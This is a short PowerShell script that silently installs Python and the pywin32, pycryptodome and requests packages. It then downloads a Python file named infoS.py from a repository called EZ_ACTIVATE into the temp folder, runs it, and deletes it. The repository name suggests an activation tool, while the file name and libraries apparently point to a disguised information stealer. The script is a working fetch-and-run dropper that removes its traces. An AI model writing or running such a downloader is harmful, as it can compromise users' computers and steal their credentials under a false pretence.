if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
    winget install --id Python.Python.3 --accept-package-agreements --accept-source-agreements
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
}

$requiredPackages = @("pywin32", "pypiwin32", "pycryptodome", "requests")
foreach ($package in $requiredPackages) {
    python -m pip install $package --quiet --disable-pip-version-check
}

$url = "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/refs/heads/main/infoS.py"
$tempFile = "$env:TEMP\infoS.py"
Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
python $tempFile
Remove-Item $tempFile
